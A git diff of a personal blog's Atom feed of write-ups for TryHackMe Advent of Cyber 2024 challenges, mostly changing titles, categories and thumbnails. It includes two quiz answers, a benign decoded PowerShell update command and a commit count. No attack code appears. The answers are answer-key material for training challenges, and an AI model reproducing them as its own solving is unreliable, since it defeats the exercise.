+<p>If you want to more about sandboxes, have a look at the room <a href="https://tryhackme.com/r/room/flarevmarsenaloftools">FlareVM: Arsenal of Tools</a>.</p>]]></content><author><name>Michael</name></author><category term="documentation" /><category term="documentation" /><category term="AoC" /><summary type="html"><![CDATA[Mayor Malware was scheming, quite full of delight, To ruin SOC-mas and frighten SOC teams. But Glitch and McSkidy had spoiled his plan, By uncovering secrets that exposed the man!]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/Day6-logo.png" /><media:content medium="image" url="http://localhost:4000/Day6-logo.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Try Hackme Advent of Cyber - Day 5</title><link href="http://localhost:4000/Day5" rel="alternate" type="text/html" title="Try Hackme Advent of Cyber - Day 5" /><published>2024-12-05T00:00:00-05:00</published><updated>2024-12-05T00:00:00-05:00</updated><id>http://localhost:4000/Day5</id><content type="html" xml:base="http://localhost:4000/Day5"><![CDATA[<h1 id="advent-of-cyber-day-5">Advent of Cyber Day 5</h1>
 
 <p>The Story</p>
 
@@ -2320,11 +2636,7 @@ What is the decoded command executed by Glitch to fix the systems of Wareville?<
 
 <p>Install-WindowsUpdate -AcceptAll -AutoReboot</p>
 
-<p>If you enjoyed this task, feel free to check out the <a href="https://tryhackme.com/r/room/investigatingwithelk101">Investigating with ELK 101</a> room.</p>]]></content><author><name>Michael</name></author><category term="documentation" /><category term="documentation" /><category term="AoC" /><category term="Day2" /><summary type="html"><![CDATA[| **Advent of Cyber: New Task Release!**One man’s false positive is another man’s potpourri. | |—-|]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/day2-logo.png" /><media:content medium="image" url="http://localhost:4000/day2-logo.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Day1</title><link href="http://localhost:4000/Day1" rel="alternate" type="text/html" title="Day1" /><published>2024-12-01T00:00:00-05:00</published><updated>2024-12-01T00:00:00-05:00</updated><id>http://localhost:4000/Day1</id><content type="html" xml:base="http://localhost:4000/Day1"><![CDATA[<hr />
-
-<h2 id="layout-post-title-try-hackme-advent-of-cyber---day-1-author-paul-le-categories-documentation-tags-documentationaoc-image-imagepng">layout: post title: “Try Hackme Advent of Cyber - Day 1” author: “Paul Le” categories: documentation tags: [documentation,AoC] image: image.png</h2>
-
-<p>The Story</p>
+<p>If you enjoyed this task, feel free to check out the <a href="https://tryhackme.com/r/room/investigatingwithelk101">Investigating with ELK 101</a> room.</p>]]></content><author><name>Michael</name></author><category term="documentation" /><category term="documentation" /><category term="AoC" /><category term="Day2" /><summary type="html"><![CDATA[| **Advent of Cyber: New Task Release!**One man’s false positive is another man’s potpourri. | |—-|]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/day2-logo.png" /><media:content medium="image" url="http://localhost:4000/day2-logo.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Try Hackme Advent of Cyber - Day 1</title><link href="http://localhost:4000/Day1" rel="alternate" type="text/html" title="Try Hackme Advent of Cyber - Day 1" /><published>2024-12-01T00:00:00-05:00</published><updated>2024-12-01T00:00:00-05:00</updated><id>http://localhost:4000/Day1</id><content type="html" xml:base="http://localhost:4000/Day1"><![CDATA[<p>The Story</p>
 
 <p>Task banner for day DAY 1
 McSkidy tapped keys with a confident grin,
@@ -2590,4 +2902,4 @@ A puzzle with gaps, a tangled design.</p>
 
 <p>What is the number of commits on the GitHub repo where the issue was raised?</p>
 
-<p>1</p>]]></content><author><name>Michael</name></author><summary type="html"><![CDATA[]]></summary></entry></feed>
+<p>1</p>]]></content><author><name>Michael</name></author><category term="documentation" /><category term="documentation" /><category term="AoC" /><summary type="html"><![CDATA[The Story]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/Day1-logo.png" /><media:content medium="image" url="http://localhost:4000/Day1-logo.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>
